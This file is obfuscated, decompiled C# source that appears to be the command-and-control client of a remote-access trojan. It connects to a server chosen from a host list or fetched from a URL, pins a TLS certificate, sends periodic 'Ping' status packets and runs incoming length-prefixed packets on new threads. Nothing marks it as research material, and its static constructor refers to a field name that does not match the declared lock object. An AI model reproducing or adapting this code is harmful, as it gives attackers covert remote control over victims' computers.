using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using jRqllyjXpPF;
using lbBmsCGqmaavDk;
using mQpicvPmEcMJ;
using tXzQcBesFjj;

namespace YspzNDIXLULee;

public static class cQQrbWXKEGPe
{
	public static Socket VtxGLzBTMyyju { get; set; }

	public static SslStream xVhYCICtpO { get; set; }

	private static byte[] deTBkyuZlzcvC { get; set; }

	private static long qinmJQyylQnTO { get; set; }

	private static long QitMiMiselPt { get; set; }

	private static Timer cUEWnRpjDzCo { get; set; }

	public static bool WhNmCMuZvIzv { get; set; }

	private static object BAXdOkaHYFSlVATO { get; }

	private static Timer JKxIqTsoRUAksc { get; set; }

	public static int GlMnhsYoBsO { get; set; }

	public static bool eEPTYqRDZXRR { get; set; }

	public static void oWcAHbtSlzxxUk()
	{
		try
		{
			VtxGLzBTMyyju = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			if (dqIziPtAElY.RWEQJQqtyTB == "null")
			{
				string text = dqIziPtAElY.KAlXieCPWk.Split(new char[1] { ',' })[new Random().Next(dqIziPtAElY.KAlXieCPWk.Split(new char[1] { ',' }).Length)];
				int port = Convert.ToInt32(dqIziPtAElY.otFqIiRkyfneZt.Split(new char[1] { ',' })[new Random().Next(dqIziPtAElY.otFqIiRkyfneZt.Split(new char[1] { ',' }).Length)]);
				if (FTrnOChmfC(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress address in hostAddresses)
					{
						try
						{
							VtxGLzBTMyyju.Connect(address, port);
							if (VtxGLzBTMyyju.Connected)
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					VtxGLzBTMyyju.Connect(text, port);
				}
			}
			else
			{
				using WebClient webClient = new WebClient();
				NetworkCredential networkCredential = (NetworkCredential)(webClient.Credentials = new NetworkCredential("", ""));
				string[] array = webClient.DownloadString(dqIziPtAElY.RWEQJQqtyTB).Split(new string[1] { ":" }, StringSplitOptions.None);
				dqIziPtAElY.KAlXieCPWk = array[0];
				dqIziPtAElY.otFqIiRkyfneZt = array[new Random().Next(1, array.Length)];
				VtxGLzBTMyyju.Connect(dqIziPtAElY.KAlXieCPWk, Convert.ToInt32(dqIziPtAElY.otFqIiRkyfneZt));
			}
			if (VtxGLzBTMyyju.Connected)
			{
				WhNmCMuZvIzv = true;
				xVhYCICtpO = new SslStream(new NetworkStream(VtxGLzBTMyyju, ownsSocket: true), leaveInnerStreamOpen: false, XlvgoOoeavqCpKa);
				xVhYCICtpO.AuthenticateAsClient(VtxGLzBTMyyju.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				qinmJQyylQnTO = 4L;
				deTBkyuZlzcvC = new byte[qinmJQyylQnTO];
				QitMiMiselPt = 0L;
				uwhrwGJNgQ(pFzHuedBzMEj.PkuDLljffduR());
				GlMnhsYoBsO = 0;
				eEPTYqRDZXRR = false;
				cUEWnRpjDzCo = new Timer(ALLdRNumfMd, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				JKxIqTsoRUAksc = new Timer(BCUFzPLlignE, null, 1, 1);
				xVhYCICtpO.BeginRead(deTBkyuZlzcvC, (int)QitMiMiselPt, (int)qinmJQyylQnTO, WfVGFeNjrcig, null);
			}
			else
			{
				WhNmCMuZvIzv = false;
			}
		}
		catch
		{
			WhNmCMuZvIzv = false;
		}
	}

	private static bool FTrnOChmfC(string XYubnktKkoUkf)
	{
		return Uri.CheckHostName(XYubnktKkoUkf) != UriHostNameType.Unknown;
	}

	private static bool XlvgoOoeavqCpKa(object DNEMbpZedQZZd, X509Certificate cdOKVnrPcN, X509Chain iYPfohAsgw, SslPolicyErrors uGbpbfoBlfMF)
	{
		return dqIziPtAElY.PExyYCKOWb.Equals(cdOKVnrPcN);
	}

	public static void lnuBQVtbtA()
	{
		try
		{
			xVhYCICtpO?.Dispose();
			VtxGLzBTMyyju?.Dispose();
			JKxIqTsoRUAksc?.Dispose();
			cUEWnRpjDzCo?.Dispose();
		}
		catch
		{
		}
		WhNmCMuZvIzv = false;
	}

	public static void WfVGFeNjrcig(IAsyncResult gJXeXjpDWIa)
	{
		try
		{
			if (VtxGLzBTMyyju.Connected && WhNmCMuZvIzv)
			{
				int num = xVhYCICtpO.EndRead(gJXeXjpDWIa);
				if (num > 0)
				{
					QitMiMiselPt += num;
					qinmJQyylQnTO -= num;
					if (qinmJQyylQnTO == 0L)
					{
						qinmJQyylQnTO = BitConverter.ToInt32(deTBkyuZlzcvC, 0);
						if (qinmJQyylQnTO > 0L)
						{
							QitMiMiselPt = 0L;
							deTBkyuZlzcvC = new byte[qinmJQyylQnTO];
							while (qinmJQyylQnTO > 0L)
							{
								int num2 = xVhYCICtpO.Read(deTBkyuZlzcvC, (int)QitMiMiselPt, (int)qinmJQyylQnTO);
								if (num2 > 0)
								{
									QitMiMiselPt += num2;
									qinmJQyylQnTO -= num2;
									if (qinmJQyylQnTO < 0L)
									{
										WhNmCMuZvIzv = false;
										return;
									}
									continue;
								}
								WhNmCMuZvIzv = false;
								return;
							}
							new Thread(udvtJaQZJQEug.SXhaOVrGwzwP).Start(deTBkyuZlzcvC);
							QitMiMiselPt = 0L;
							qinmJQyylQnTO = 4L;
							deTBkyuZlzcvC = new byte[qinmJQyylQnTO];
						}
						else
						{
							qinmJQyylQnTO = 4L;
							deTBkyuZlzcvC = new byte[qinmJQyylQnTO];
							QitMiMiselPt = 0L;
						}
					}
					else if (qinmJQyylQnTO < 0L)
					{
						WhNmCMuZvIzv = false;
						return;
					}
					xVhYCICtpO.BeginRead(deTBkyuZlzcvC, (int)QitMiMiselPt, (int)qinmJQyylQnTO, WfVGFeNjrcig, null);
				}
				else
				{
					WhNmCMuZvIzv = false;
				}
			}
			else
			{
				WhNmCMuZvIzv = false;
			}
		}
		catch
		{
			WhNmCMuZvIzv = false;
		}
	}

	public static void uwhrwGJNgQ(byte[] qZPUUYYiAxBBRsX)
	{
		lock (BAXdOkaHYFSlVATO)
		{
			try
			{
				if (!WhNmCMuZvIzv)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(qZPUUYYiAxBBRsX.Length);
				VtxGLzBTMyyju.Poll(-1, SelectMode.SelectWrite);
				xVhYCICtpO.Write(bytes, 0, bytes.Length);
				if (qZPUUYYiAxBBRsX.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(qZPUUYYiAxBBRsX))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							VtxGLzBTMyyju.Poll(-1, SelectMode.SelectWrite);
							xVhYCICtpO.Write(array, 0, num);
							xVhYCICtpO.Flush();
						}
						return;
					}
				}
				VtxGLzBTMyyju.Poll(-1, SelectMode.SelectWrite);
				xVhYCICtpO.Write(qZPUUYYiAxBBRsX, 0, qZPUUYYiAxBBRsX.Length);
				xVhYCICtpO.Flush();
			}
			catch
			{
				WhNmCMuZvIzv = false;
			}
		}
	}

	public static void ALLdRNumfMd(object kRRVqfiTSizLd)
	{
		try
		{
			oBaGoFGSOWPojT oBaGoFGSOWPojT = new oBaGoFGSOWPojT();
			oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Packet").UPNpZCCgWUpsQj = "Ping";
			oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Message").UPNpZCCgWUpsQj = ieGRLlRyWBE.ezgUAvBNkDxRLp();
			uwhrwGJNgQ(oBaGoFGSOWPojT.MrbeXnLKFMlfC());
			GC.Collect();
			eEPTYqRDZXRR = true;
		}
		catch
		{
		}
	}

	private static void BCUFzPLlignE(object tXZdrznjsq)
	{
		try
		{
			if (eEPTYqRDZXRR && WhNmCMuZvIzv)
			{
				GlMnhsYoBsO++;
			}
		}
		catch
		{
		}
	}

	static cQQrbWXKEGPe()
	{
		_003CSendSync_003Ek__BackingField = new object();
	}
}
